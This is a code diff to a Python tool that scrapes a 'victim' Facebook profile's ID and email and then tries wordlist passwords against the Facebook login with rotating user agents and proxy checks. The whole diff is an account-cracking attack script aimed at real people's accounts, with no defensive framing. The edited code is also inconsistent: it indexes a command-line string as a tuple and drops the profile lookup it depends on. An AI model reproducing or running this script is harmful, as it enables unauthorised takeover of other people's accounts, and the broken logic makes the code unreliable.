@@ -6,15 +6,34 @@ import random
 import re
 import requests
 import mechanize
-import argparse  # Add this line for argparse
+import argparse
 
-# Colors (unchanged)
+# Colors
+blue = "\033[1;34m"
+wi = "\033[1;37m"
+rd = "\033[1;31m"
+gr = "\033[1;32m"
+yl = "\033[1;33m"
 
-# Hosting Secure Connection (unchanged)
+# Hosting Secure Connection
+def check_network():
+    try:
+        ip = socket.gethostbyname("www.google.com")
+        con = socket.create_connection((ip, 80), 2)
+        return True
+    except socket.error:
+        return False
 
-# Checking Proxy and Ports (unchanged)
+# Checking Proxy and Ports
+def check_proxy(ip, port=None):
+    proxy = '{}:8080'.format(ip) if port is None else '{}:{}'.format(ip, port)
+    proxies = {'https': "https://" + proxy, 'http': "http://" + proxy}
+    try:
+        r = requests.get('https://www.wikipedia.org', proxies=proxies, timeout=5)
+        return ip == r.headers.get('X-Client-IP')
+    except Exception:
+        return False
 
-# Choice Random User-Agent supporting browser (unchanged)
 # Choice Random User-Agent supporting browser
 def get_user_agent():
     useragents = [
@@ -28,31 +47,33 @@ def get_user_agent():
     ]
     return random.choice(useragents)
 
-
 # Fetching Victim Profile ID
 def get_profile_id(url):
     try:
         id_re = re.compile('"entity_id":"([0-9]+)"')
         content = requests.get(url).content
         profile_id = id_re.findall(content)
+        email_re = re.compile('"email":"([^"]+)"')
+        email = email_re.findall(content)
         print(blue + "\n[" + wi + "*" + blue + "] Target Profile" + wi + " ID: " + yl + profile_id[0] + wi)
-        return profile_id[0]  # Return the profile ID
+        print(blue + "\n[" + wi + "*" + blue + "] Target Profile" + wi + " Email: " + yl + email[0] + wi)
+        return profile_id[0], email[0]
     except IndexError:
         print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " Please Check Your Victim Profile URL " + rd + "!!!" + wi)
         exit(1)
 
 # Brute Force
-def brute_force(url, profile_id, wordlist):  # Modify function parameters
+def brute_force(url, profile_id, wordlist):
     try:
         session = requests.Session()
         session.headers['User-Agent'] = get_user_agent()
 
         for password in wordlist:
             payload = {
-                'email': 'your_email@example.com',
+                'email': profile_id[1],  # Use the email obtained from the victim's profile
                 'pass': password
             }
-            response = session.post(url + profile_id, data=payload)
+            response = session.post(url + profile_id[0], data=payload)
 
             if "Login failed" not in response.text:
                 print(blue + "\n[" + wi + "*" + blue + "] Password Found:" + yl + f" {password}" + wi)
@@ -69,8 +90,6 @@ if __name__ == "__main__":
     args = parser.parse_args()
 
     # Replace 'your_url' with the actual URL
-    url = 'your_url'
-    # Fetch the profile ID
-    profile_id = get_profile_id(url)
+    url = 'https://www.facebook.com/'
     # Replace 'your_wordlist.txt' with the actual wordlist file path
     brute_force(url, args.profile_id, ['password1', 'password2', 'password3'])  # Replace with your custom wordlist
